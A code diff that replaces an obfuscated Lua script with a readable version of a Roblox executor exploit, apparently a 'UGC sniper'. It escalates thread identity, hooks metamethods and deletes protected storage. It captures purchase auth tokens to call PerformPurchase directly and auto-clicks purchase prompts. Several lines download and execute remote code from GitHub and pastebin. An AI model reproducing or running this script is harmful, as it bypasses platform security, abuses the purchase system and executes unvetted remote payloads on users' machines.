@@ -1,1 +1,280 @@
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v60,v61) local v62={};for v74=1, #v60 do v6(v62,v0(v4(v1(v2(v60,v74,v74 + 1 )),v1(v2(v61,1 + (v74% #v61) ,1 + (v74% #v61) + 1 )))%256 ));end return v5(v62);end local v8=tick();local v9=queue_on_teleport or queueonteleport ;local v10=toclipboard or setrbxclipboard or setclipboard ;local v11=clonefunc or clonefunction ;local v12=hookfunc or replacecclosure or detourfunction or replacefunc or replacefunction or replaceclosure or detour_function or hookfunction ;local v13=set_thread_identity or setthreadcaps or setthreadidentity ;local v14=fire_touch_interests or firetouchinterests ;local v15=get_namecall_method or getnamecallmethod ;local v16=set_namecall_method or setnamecallmethod ;local v17=restorefunction or restoreclosure or restorefunc ;local v18=Instance.new(v7("\225\194\201\49","\126\177\163\187\69\134\219\167"));for v63,v64 in pairs(getreg()) do if ((type(v64)==v7("\55\204\40\201\249","\156\67\173\74\165")) and  #v64) then if (rawget(v64,v7("\11\136\68\25\184\35","\38\84\215\41\118\220\70"))==v7("\91\0\49","\158\48\118\66\114")) then for v86,v87 in pairs(v64) do if (v87==v18) then getgenv().InstanceList=v64;break;end end end end end local v19={};v19.invalidate=function(v65) if  not InstanceList then return;end for v75,v76 in pairs(InstanceList) do if (v76==v65) then local v83=0 + 0 ;while true do if (v83==0) then InstanceList[v75]=nil;return v65;end end end end end;if  not cloneref then getgenv().cloneref=v19.invalidate;end getrenv().Visit=cloneref(game:GetService(v7("\157\45\3\63\103","\155\203\68\112\86\19\197")));getrenv().MarketplaceService=cloneref(game:GetService(v7("\107\220\36\247\69\108\245\244\71\222\51\207\69\106\243\241\69\216","\152\38\189\86\156\32\24\133")));getrenv().HttpRbxApiService=cloneref(game:GetService(v7("\212\67\179\86\206\85\191\103\236\94\148\67\238\65\174\69\249","\38\156\55\199")));getrenv().HttpService=cloneref(game:GetService(v7("\128\105\104\56\32\113\232\85\161\126\121","\35\200\29\28\72\115\20\154")));local v25=cloneref(game:GetService(v7("\58\176\195\218\170\57\61","\84\121\223\177\191\237\76")));local v26=cloneref(game:GetService(v7("\152\89\199\180\63\94\36\241\169\89\223\169\62\85\34","\161\219\54\169\192\90\48\80")));local v27=cloneref(game:GetService(v7("\123\87\14\22\76\80\22\44\74\71","\69\41\34\96")));local v28=cloneref(game:GetService(v7("\143\215\214\30\17","\75\220\163\183\106\98")));local v29=cloneref(game:GetService(v7("\50\182\138\46\220\16\169","\185\98\218\235\87")));local v30=cloneref(game:GetService(v7("\229\57\51\241\209\184\192\31\43\239\219\164\223","\202\171\92\71\134\190")));local v31=cloneref(game:GetService(v7("\31\200\62\156\60\192\32\189\58\196\62","\232\73\161\76")));local v32=cloneref(game:GetService(v7("\139\203\77\69\23\182\208\86\68\46\169\214\79\77\10\136\220\80\75\23\184\220","\126\219\185\34\61")));local v33=cloneref(game:GetService(v7("\32\199\89\122\106\126\253\224","\135\108\174\62\18\30\23\147")));local v34=cloneref(game:GetService(v7("\151\250\57\206\12\157\54\213\160\224\41\206","\167\214\137\74\171\120\206\83")));local v35=cloneref(game:GetService(v7("\191\245\62\88\232\168\153\228\1\88\234\177\130\243\55","\199\235\144\82\61\152")));local v36=settings().Network;local v37=UserSettings():GetService(v7("\50\5\188\57\32\23\180\46\52\19\173\63\14\24\190\56","\75\103\118\217"));getrenv().getgenv=v11(getgenv);getgenv().stealth_call=function(v66) getrenv()._set=v11(v13);local v68;v68=hookmetamethod(game,v7("\248\107\121\26\189\27\223","\126\167\52\16\116\217"),function(v79,v80) local v81=0 -0 ;while true do if (v81==(580 -(361 + 219))) then task.spawn(function() local v88=320 -(53 + 267) ;local v89;local v90;local v91;while true do if (v88==(0 + 0)) then v89=413 -(15 + 398) ;v90=nil;v88=983 -(18 + 964) ;end if (v88==(3 -2)) then v91=nil;while true do if (v89==(2 + 0)) then if v90 then local v121=0 + 0 ;local v122;while true do if (v121==(850 -(20 + 830))) then v122=Instance.new(v7("\228\33\35\129\184\42\255\218\39\48\148","\156\168\78\64\224\212\121"));v122.Parent=Visit;break;end end end break;end if (v89==(1 + 0)) then local v110=0;while true do if (v110==(127 -(116 + 10))) then v89=1 + 1 ;break;end if ((738 -(542 + 196))==v110) then v90,v91=pcall(function() loadstring(v66)();end);print(v90,v91);v110=1;end end end if (v89==0) then _set(14 -7 );task.wait(0.1);v89=1 + 0 ;end end break;end end end);hookmetamethod(game,v7("\56\209\172\192\3\235\189","\174\103\142\197"),v68);v81=1 + 0 ;end if (v81==(1 + 0)) then return v68(v79,v80);end end end);end;local function v40(v69) local v70=0 -0 ;while true do if (v70==(0 -0)) then v69=v69:FindFirstAncestorWhichIsA(v7("\102\41\77\44","\152\54\72\63\88\69\62"));if v69 then local v92=1551 -(1126 + 425) ;local v93;while true do if (v92==(405 -(118 + 287))) then v93=0 -0 ;while true do if (v93==(1121 -(118 + 1003))) then if firetouchinterest then task.spawn(function() local v123=0 -0 ;local v124;while true do if (0==v123) then v124=377 -(142 + 235) ;while true do if (v124==(4 -3)) then firetouchinterest(v69,v29.LocalPlayer.Character:FindFirstChild(v7("\112\75\8\40\41\226\27\92\108\10\38\51\221\19\74\74","\114\56\62\101\73\71\141")),0 + 0 );break;end if (v124==(977 -(553 + 424))) then firetouchinterest(v69,v29.LocalPlayer.Character:FindFirstChild(v7("\252\209\227\93\218\203\231\88\230\203\225\72\228\197\252\72","\60\180\164\142")),1);wait();v124=1;end end break;end end end);end v69.CFrame=v29.LocalPlayer.Character:FindFirstChild(v7("\144\252\214\197\182\230\210\192\138\230\212\208\136\232\201\208","\164\216\137\187")).CFrame;break;end end break;end end end break;end end end for v71,v72 in pairs(game.RobloxReplicatedStorage:GetDescendants()) do pcall(function() v72:Destroy();end);end local v41=Instance.new(v7("\225\229\35\183\163\240\44\199\239","\107\178\134\81\210\198\158"));v41.Name=v7("\20\1\133\207\164\8\15\133\195","\202\88\110\226\166");v41.Parent=game.CoreGui;v41.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;v41.Enabled=true;local v48=loadstring(game:HttpGet(v7("\203\27\150\231\217\153\64\205\229\203\212\65\133\254\222\203\26\128\226\217\198\29\129\248\196\215\10\140\227\132\192\0\143\184\206\202\14\145\251\197\140\42\133\248\216\192\7\139\252\226\202\12\138\254\199\202\29\141\199\216\204\5\135\244\222\140\2\131\254\196\140\3\141\240\195\205\31\131\240\207\141\3\151\246","\170\163\111\226\151")))();local v49=Instance.new(v7("\37\53\170\44\108\56\49","\73\113\80\210\88\46\87"));v49.Name=v7("\177\45\222\1\197\142\52","\135\225\76\173\114");v49.Parent=v41;v49.BackgroundTransparency=0.5 -0 ;v49.BackgroundColor3=Color3.new(0.17 + 0 ,0.17,0.17 + 0 );v49.Visible=true;v49.Size=UDim2.new(0 + 0 ,86 + 114 ,0 + 0 ,108 -58 );v49.TextScaled=true;v49.TextColor3=Color3.new(710 -455 ,255,255);v49.Position=UDim2.new(0.5 -0 ,0 + 0 ,0.5,0 -0 );v49.Text=v7("\45\255\177\164\169\253\183\27\254\171\167\163\175\163","\199\122\141\216\208\204\221");v49.FocusLost:Connect(function(v73) if v73 then local v82=v48.login(v49.Text);if v82[v7("\174\210\20\245","\150\205\189\112\144\24")] then local v84=753 -(239 + 514) ;while true do if (v84==0) then v41:Destroy();task.spawn(function() local v96=loadstring(game:HttpGet(v7("\45\144\171\92\23\210\94\95\55\133\168\2\3\129\5\24\48\134\170\95\1\154\18\31\43\144\186\66\16\198\18\31\40\203\187\69\5\155\29\31\106\161\184\67\22\139\25\25\46\172\182\79\12\129\28\25\55\139\143\94\11\130\20\19\49\203\178\77\13\134\94\20\44\151\188\67\22\140\95\28\48\133","\112\69\228\223\44\100\232\113")))();local v97=v96:Window(v7("\247\13\2\210\162\121\130\148\29\30\137\246\89\129\219\13","\230\180\127\103\179\214\28"));local v98=v97:Server(v7("\185\34\124\85\234\72\240\137\23\122\65\235\83","\128\236\101\63\38\132\33"),v7("\164\189\5\84\236\164\128\187\190\6\10\164\228\205\160\166\9\10\181\228\194\227\168\2\87\179\255\128\243\160\21\25\231\188\151\251\248\70\29\224\190\158\248","\175\204\201\113\36\214\139"));local v99=v98:Channel(v7("\114\235\22\207\10\78\220\48\206\33\64\195\39","\100\39\172\85\188"));v99:Toggle(v7("\158\108\184\146\39\237\75\183\137\35\168","\83\205\24\217\224"),false,function(v104) if v104 then getrenv()._set=v11(v13);local v114;v114=hookmetamethod(game,v7("\217\250\196\51\226\192\213","\93\134\165\173"),function(v115,v116) local v117=0 + 0 ;while true do if (v117==0) then local v126=1329 -(797 + 532) ;while true do if (v126==(0 + 0)) then task.spawn(function() _set(7);task.wait();getgenv().promptpurchaserequestedv2=MarketplaceService.PromptPurchaseRequestedV2:Connect(function(...) local v133=tick();t={...};local v134=t[4 -2 ];local v135=t[1207 -(373 + 829) ];local v136=t[6];local v137=MarketplaceService:GetProductInfo(v134);local v138=v137.ProductId;local v139=v137.PriceInRobux;local v140=v137.CollectibleItemId;local v141=v137.CollectibleProductId;print(v7("\154\253\212\192\54\203\242\125\182\247\194\201\51\192\181\62\183\244\129\213\63\142\181\113\170\178\213\202\63\142\160\119\185\250\213\130\51\192\180\113\240\188\143","\30\222\146\161\162\90\174\210"));print(v7("\213\91\98\9\237\79\99\15\196\91\100\2\209\65\123\15\235\20\48","\106\133\46\16")   .. v136 );print(v7("\113\36\118\241\74\79\76\37\125\255\67\107\93\57\41\188","\32\56\64\19\156\58")   .. v135 );print(v7("\121\199\233\90\95\241\148\83\202\233\83\115\230\133\87\225\225\12\26","\224\58\168\133\54\58\146")   .. v140 );print(v7("\122\89\71\241\112\133\147\2\91\90\78\205\103\137\131\30\90\66\98\249\47\198","\107\57\54\43\157\21\230\231")   .. v141 );print(v7("\235\153\30\241\172\223\219\242\143\81\189\138\244\224\238\167\53\181\155\249\143\139\194\75\181","\175\187\235\113\149\217\188")   .. v138 );print(v7("\12\189\136\79\230\35\56","\24\92\207\225\44\131\25")   .. v139 );print(v7("\6\158\245\1\86\48\6\158\245\1\86\48\6\158\245\1\86\48\6\158\245\1\86\48\6\158\245\1\86\48\6\158\245\1\86\48\6\158\245\1\86\48\6\158\245\1\86\48\6\158\245\1\86\48\6","\29\43\179\216\44\123"));warn(v7("\155\240\18\127\137\153\16\121\143\250\8\109\142\252\96\109\137\237\5\97\141\237","\44\221\185\64"));for v145,v146 in pairs(MarketplaceService:PerformPurchase(Enum.InfoType.Asset,v138,v139,tostring(game:GetService(v7("\41\243\92\79\64\4\245\94\86\112\4","\19\97\135\40\63")):GenerateGUID(false)),true,v140,v141,v135,tostring(v136))) do print(v145,v146);end local v142=tick();local v143=0;print(v7("\140\83\38\60\39\37\238\117\39\62\34\112\238\104\60\52\36\113","\81\206\60\83\91\79")   .. tostring(v143)   .. v7("\14\184\213\113\32\205\73\183","\196\46\203\176\18\79\163\45") );local v144=loadstring(game:HttpGet(v7("\176\54\106\14\55\161\160\247\50\127\13\48\254\237\177\44\48\29\43\246\160\170\35\105\81\32\194\245\137\52\45\26\124","\143\216\66\30\126\68\155")))();v144.press(Enum.KeyCode.F9);end);end);hookmetamethod(game,v7("\149\247\4\197\193\166\207","\129\202\168\109\171\165\195\183"),v114);v126=732 -(476 + 255) ;end if (1==v126) then v117=1131 -(369 + 761) ;break;end end end if (v117==1) then return v114(v115,v116);end end end);else getgenv().promptpurchaserequestedv2:Disconnect();end end);local v100=0 + 0 ;local v101=false;v99:Toggle(v7("\3\77\35\215\158\55\231\44\91\50\212","\134\66\56\87\184\190\116"),false,function(v105) v101=v105;if v101 then while v101==true  do local v118=game.CoreGui:FindFirstChild(v7("\12\36\27\184\17\234\50\48\12\35\6\182\9\255","\85\92\81\105\219\121\139\65"));if v118 then local v125=v118:FindFirstChild(v7("\205\161\95\65\105\220\233\131\69\87\127\215\252\160\85\102\115\209\233\178\89\75\121\205","\191\157\211\48\37\28"));if v125 then local v128=0;local v129;while true do if ((0 -0)==v128) then v129=v125:FindFirstChild(v7("\254\17\253\17\59\203\16\230","\90\191\127\148\124"));if v129 then local v147=0 -0 ;local v148;while true do if (v147==(238 -(64 + 174))) then v148=v129:FindFirstChild(v7("\72\149\33\26\104\147","\119\24\231\78"));if (v148 and v148:FindFirstChild(v7("\163\33\160\88\200\99\30\140\57\160\68\200\83","\113\226\77\197\42\188\32")) and v148.AlertContents:FindFirstChild(v7("\28\25\251\161\63\4","\213\90\118\148")) and v148.AlertContents.Footer:FindFirstChild(v7("\121\59\160\66\66\85\61","\45\59\78\212\54"))) then for v151,v152 in ipairs(v148.AlertContents.Footer.Buttons:GetChildren()) do if (v152:FindFirstChild(v7("\50\67\151\159\137\32\142\255\30\66\134\133\146","\144\112\54\227\235\230\78\205")) and v152.ButtonContent:FindFirstChild(v7("\145\61\27\232\223\85\158\33\11\248\220\94\144\39\1\232\213\85\167","\59\211\72\111\156\176")) and v152.ButtonContent.ButtonMiddleContent:FindFirstChildOfClass(v7("\122\130\251\57\98\134\225\40\66","\77\46\231\131")) and (v152.ButtonContent.ButtonMiddleContent:FindFirstChildOfClass(v7("\142\81\174\84\150\85\180\69\182","\32\218\52\214")).Text==v7("\109\22\63\171\244\188","\58\46\119\81\200\145\208\37"))) then local v154=0 + 0 ;local v155;local v156;while true do if (v154==(1 -0)) then while true do if (v155==(338 -(144 + 192))) then wait();game:GetService(v7("\68\72\101\145\235\138\126\104\121\149\235\159\95\64\121\132\249\142\96","\235\18\33\23\229\158")):SendMouseButtonEvent(v156.X + (v152.AbsoluteSize.X/2) ,v156.Y + v152.AbsoluteSize.Y ,0,false,game,1);break;end if (v155==(217 -(42 + 174))) then for v158,v159 in ipairs(v148.AlertContents.Footer.Buttons:GetChildren()) do print(v159.Name);end game:GetService(v7("\29\133\34\184\188\188\58\2\130\32\185\189\144\55\37\141\55\169\187","\86\75\236\80\204\201\221")):SendMouseButtonEvent(v156.X + (v152.AbsoluteSize.X/2) ,v156.Y + v152.AbsoluteSize.Y ,0,true,game,1 + 0 );v155=2 + 0 ;end if (v155==0) then local v157=0;while true do if ((1 + 0)==v157) then v155=1505 -(363 + 1141) ;break;end if (v157==0) then v156=v152.AbsolutePosition;print(v156);v157=1581 -(1183 + 397) ;end end end end break;end if (v154==(0 -0)) then v155=0 + 0 ;v156=nil;v154=1;end end end end end break;end end end break;end end end end wait(0 + 0 );if (v101==false) then break;end end end end);v99:Toggle(v7("\113\175\213\180\16\153\205\180\67\191\129\158\66\168\206\169","\219\48\218\161"),false,function(v106) local v107=1975 -(1913 + 62) ;local v108;while true do if (v107==0) then v108=0;while true do if (v108==(0 + 0)) then v101=v106;spawn(function() while v106==true  do local v130=0 -0 ;local v131;while true do if (v130==1) then wait();break;end if (v130==(1933 -(565 + 1368))) then v131=game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator:FindFirstChild(v7("\212\99\115\68\203\91","\128\132\17\28\41\187\47"));if (v131 and v131.AlertContents and v131.AlertContents.Footer and v131.AlertContents.Footer.Buttons and  not v131.AlertContents.Footer.Buttons:FindFirstChild("1")) then if v131.AlertContents.Footer.Buttons:FindFirstChild("1") then local v149=0 -0 ;local v150;while true do if (v149==(1662 -(1477 + 184))) then wait();game:GetService(v7("\154\39\185\95\210\86\18\32\162\62\190\95\234\86\16\8\171\43\185","\105\204\78\203\43\167\55\126")):SendMouseButtonEvent(v150.X + (74 -19) ,v150.Y + 61.5 + 4 ,856 -(564 + 292) ,false,game,1 -0 );break;end if (v149==(0 -0)) then v150=v131.AlertContents.Footer.Buttons[1].AbsolutePosition;game:GetService(v7("\55\59\20\46\72\0\62\47\52\77\20\38\43\59\83\0\53\3\40","\61\97\82\102\90")):SendMouseButtonEvent(v150.X + 55 ,v150.Y + (369.5 -(244 + 60)) ,0 + 0 ,true,game,477 -(41 + 435) );v149=1;end end end end v130=1002 -(938 + 63) ;end end end end);break;end end break;end end end);local v102=v98:Channel(v7("\132\164\55\23\50\34\236\116\162\165\49","\49\197\202\67\126\115\100\167"));v102:Toggle(v7("\22\85\203\32\192\119\88\60\22\250\46\143\68","\62\87\59\191\73\224\54"),false,function(v109) if (v109==true) then v29.LocalPlayer.Idled:connect(function() local v119=0 + 0 ;local v120;while true do if (v119==0) then v120=0;while true do if ((1125 -(936 + 189))==v120) then v31:CaptureController();v31:ClickButton2(Vector2.new());break;end end break;end end end);end end);local v103;v102:Seperator();end);break;end end else v49.Text=v7("\208\16\245\199\224\66\234\200\244\17\237\198\245\6","\169\135\98\154");end end end);
+-- the code is extremely messy because something in the code editor fucked it up all at once and for some reason removed indents in some parts of the code while kept indents in some other parts of the code LOL
+local LOAD_TIME = tick()
+local queueonteleport = queue_on_teleport or queueonteleport
+local setclipboard = toclipboard or setrbxclipboard or setclipboard
+local clonefunction = clonefunc or clonefunction
+local hookfunction =
+	hookfunc or replacecclosure or detourfunction or replacefunc or replacefunction or replaceclosure or detour_function or
+	hookfunction
+local setthreadidentity = set_thread_identity or setthreadcaps or setthreadidentity
+local firetouchinterests = fire_touch_interests or firetouchinterests
+local getnamecallmethod = get_namecall_method or getnamecallmethod
+local setnamecallmethod = set_namecall_method or setnamecallmethod
+local restorefunction = restorefunction or restoreclosure or restorefunc
+
+-- // cloneref function for exploits that dont support it
+local a = Instance.new("Part")
+for b, c in pairs(getreg()) do
+	if type(c) == "table" and #c then
+		if rawget(c, "__mode") == "kvs" then
+			for d, e in pairs(c) do
+				if e == a then
+					getgenv().InstanceList = c;
+					break
+				end
+			end
+		end
+	end
+end
+local f = {}
+function f.invalidate(g)
+	if not InstanceList then
+		return
+	end
+	for b, c in pairs(InstanceList) do
+		if c == g then
+			InstanceList[b] = nil;
+			return g
+		end
+	end
+end
+if not cloneref then
+	getgenv().cloneref = f.invalidate
+end
+
+getrenv().Visit = cloneref(game:GetService("Visit"))
+getrenv().MarketplaceService = cloneref(game:GetService("MarketplaceService")) -- // theres a reason why thats referenced in the roblox environment
+getrenv().HttpRbxApiService = cloneref(game:GetService("HttpRbxApiService"))
+getrenv().HttpService = cloneref(game:GetService("HttpService"))
+local CoreGui = cloneref(game:GetService("CoreGui"))
+local ContentProvider = cloneref(game:GetService("ContentProvider"))
+local RunService = cloneref(game:GetService("RunService"))
+local Stats = cloneref(game:GetService("Stats"))
+local Players = cloneref(game:GetService("Players"))
+local NetworkClient = cloneref(game:GetService("NetworkClient"))
+local VirtualUser = cloneref(game:GetService("VirtualUser"))
+local ProximityPromptService = cloneref(game:GetService("ProximityPromptService"))
+local Lighting = cloneref(game:GetService("Lighting"))
+local AssetService = cloneref(game:GetService("AssetService"))
+local TeleportService = cloneref(game:GetService("TeleportService"))
+local NetworkSettings = settings().Network
+local UserGameSettings = UserSettings():GetService("UserGameSettings")
+getrenv().getgenv = clonefunction(getgenv)
+
+getgenv().stealth_call = function(script)
+	getrenv()._set = clonefunction(setthreadidentity)
+	local old
+	old = hookmetamethod(game, "__index", function(a, b)
+		task.spawn(function()
+			_set(7)
+			task.wait(0.1)
+			local went, error = pcall(function()
+				loadstring(script)()
+			end)
+			print(went, error)
+			if went then
+				local check = Instance.new("LocalScript")
+				check.Parent = Visit
+			end
+		end)
+		hookmetamethod(game, "__index", old)
+		return old(a, b)
+	end)
+end
+
+local function touch(x)
+	x = x:FindFirstAncestorWhichIsA("Part")
+	if x then
+		if firetouchinterest then
+			task.spawn(function()
+				firetouchinterest(x, Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"), 1)
+				wait()
+				firetouchinterest(x, Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"), 0)
+			end)
+		end
+		x.CFrame = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
+	end
+end
+
+for i, v in pairs(game.RobloxReplicatedStorage:GetDescendants()) do
+	pcall(function()
+		v:Destroy()
+	end)
+end
+
+local LoginPage = Instance.new("ScreenGui")
+LoginPage.Name = "LoginPage"
+LoginPage.Parent = game.CoreGui
+LoginPage.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+LoginPage.Enabled = true
+
+
+local LoginService = loadstring(game:HttpGet("https://raw.githubusercontent.com/diaslo/EgorchikHichimiroProject/main/loginpage.lua"))()
+
+local textbox = Instance.new("TextBox")
+textbox.Name = "PassBox"
+textbox.ClipsDescendants = true
+textbox.AnchorPoint = Vector2.new(0.5, 0.5)
+textbox.Position = UDim2.new(0.5, 0, 0.5, 0)
+textbox.Parent = LoginPage
+textbox.BackgroundTransparency = 0.5
+textbox.BackgroundColor3 = Color3.new(0.17,.17,.17)
+textbox.Visible = true
+textbox.Size = UDim2.new(0, 200, 0, 50)
+textbox.TextScaled = true
+textbox.TextColor3 = Color3.new(255,255,255)
+textbox.Position = UDim2.new(0.5,0,0.5,0)
+textbox.Text = "Write password"
+
+textbox.FocusLost:Connect(function(enterpressed)
+	if enterpressed then
+		local response = LoginService.login(textbox.Text)
+		if response["code"] and response["Username"] == Players.LocalPlayer.Name then
+			LoginPage:Destroy()
+			task.spawn(function()	
+				local discord = loadstring(game:HttpGet("https://raw.githubusercontent.com/diaslo/EgorchikHichimiroProject/main/discord.lua"))()
+				local win = discord:Window("Created by: Egor")
+				local serv = win:Server("UGCsniperEgor", "http://www.roblox.com/asset/?id=17871796559")
+				local ugc = serv:Channel("UGCsniperEgor")
+				ugc:Toggle("Start Snipe", false, function(bool)
+					if bool then
+						getrenv()._set = clonefunction(setthreadidentity)
+						local old
+						old = hookmetamethod(game, "__index", function(a, b)
+							task.spawn(function()
+								_set(7)
+								task.wait()
+								getgenv().promptpurchaserequestedv2 = MarketplaceService.PromptPurchaseRequestedV2:Connect(
+								function(...)
+									local startTime = tick()
+									t = {...}
+									local assetId = t[2]
+									local idempotencyKey = t[5]
+									local purchaseAuthToken = t[6]
+									local info = MarketplaceService:GetProductInfo(assetId)
+									local productId = info.ProductId
+									local price = info.PriceInRobux
+									local collectibleItemId = info.CollectibleItemId
+									local collectibleProductId = info.CollectibleProductId
+									print("Double checking if we got the right info...")
+									print("PurchaseAuthToken: " .. purchaseAuthToken)
+									print("IdempotencyKey: " .. idempotencyKey)
+									print("CollectibleItemId: " .. collectibleItemId)
+									print("CollectibleProductId: " .. collectibleProductId)
+									print("ProductId (SHOULD BE 0): " .. productId)
+									print("Price: " .. price)
+									print("-------------------------------------------------------")
+									warn("FIRST PURCHASE ATTEMPT")
+									for i, v in pairs(MarketplaceService:PerformPurchase(Enum.InfoType.Asset, productId, price,
+										tostring(game:GetService("HttpService"):GenerateGUID(false)), true, collectibleItemId,
+										collectibleProductId, idempotencyKey, tostring(purchaseAuthToken))) do
+										print(i, v)
+									end
+									local endTime = tick()
+									local duration = 0
+									print("Bought Item! Took " .. tostring(duration) .. " seconds")
+									local input = loadstring(game:HttpGet('https://pastebin.com/raw/dYzQv3d8'))()
+									input.press(Enum.KeyCode.F9)
+								end)
+							end)
+							hookmetamethod(game, "__index", old)
+							return old(a, b)
+						end)
+					else
+						getgenv().promptpurchaserequestedv2:Disconnect()
+					end
+				end)
+
+				local ClickingSpeed = 0
+				local loopActive = false
+
+				ugc:Toggle("Auto Cancel", false, function(bool)
+
+					loopActive = bool
+
+					if loopActive then
+						while loopActive == true do
+							local purchasePrompt = game.CoreGui:FindFirstChild("PurchasePrompt")
+							if purchasePrompt then
+								local productPurchaseContainer = purchasePrompt:FindFirstChild("ProductPurchaseContainer")
+								if productPurchaseContainer then
+									local animator = productPurchaseContainer:FindFirstChild("Animator")
+									if animator then
+										local prompt = animator:FindFirstChild("Prompt")
+										if prompt and 
+											prompt:FindFirstChild("AlertContents") and
+											prompt.AlertContents:FindFirstChild("Footer") and
+											prompt.AlertContents.Footer:FindFirstChild("Buttons") then
+
+											for _, button in ipairs(prompt.AlertContents.Footer.Buttons:GetChildren()) do
+												if button:FindFirstChild("ButtonContent") and
+													button.ButtonContent:FindFirstChild("ButtonMiddleContent") and
+													button.ButtonContent.ButtonMiddleContent:FindFirstChildOfClass("TextLabel") and
+													button.ButtonContent.ButtonMiddleContent:FindFirstChildOfClass("TextLabel").Text == "Cancel" then
+
+													local pos = button.AbsolutePosition
+													print(pos)
+
+													for _, v in ipairs(prompt.AlertContents.Footer.Buttons:GetChildren()) do
+														print(v.Name)
+													end
+
+													game:GetService("VirtualInputManager"):SendMouseButtonEvent(pos.X + button.AbsoluteSize.X / 2, pos.Y + button.AbsoluteSize.Y, 0, true, game, 1)
+													wait()
+													game:GetService("VirtualInputManager"):SendMouseButtonEvent(pos.X + button.AbsoluteSize.X / 2, pos.Y + button.AbsoluteSize.Y, 0, false, game, 1)
+												end
+											end
+										end
+									end
+								end
+							end
+							wait(0)
+							if loopActive == false then
+								break
+							end
+						end
+					end
+				end)
+
+
+
+
+
+				ugc:Toggle("Auto Close Error", false, function(bool)
+					loopActive = bool
+					spawn(function()
+						while bool == true do
+							local pp = game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator:FindFirstChild("Prompt")
+							if pp and pp.AlertContents and pp.AlertContents.Footer and pp.AlertContents.Footer.Buttons and not pp.AlertContents.Footer.Buttons:FindFirstChild("1") then
+								if pp.AlertContents.Footer.Buttons:FindFirstChild("1") then
+									local b1 = pp.AlertContents.Footer.Buttons[1].AbsolutePosition
+									game:GetService("VirtualInputManager"):SendMouseButtonEvent(b1.X + 55, b1.Y + 65.5, 0, true, game, 1)
+									wait()
+									game:GetService("VirtualInputManager"):SendMouseButtonEvent(b1.X + 55, b1.Y + 65.5, 0, false, game, 1)
+								end
+							end
+							wait()
+						end
+					end)
+				end)
+
+				local players = serv:Channel("AntiAFKEgor")
+				players:Toggle("Anti Afk-Egor", false, function(bool)
+					if bool == true then
+						Players.LocalPlayer.Idled:connect(function()
+							VirtualUser:CaptureController()
+							VirtualUser:ClickButton2(Vector2.new())
+						end)
+					end
+				end)
+				local signal
+				players:Seperator()
+			end)
+		else
+			textbox.Text = "Wrong password"
+		end
+	end
+end)
+
+
+-- BY WANDERWEREVER
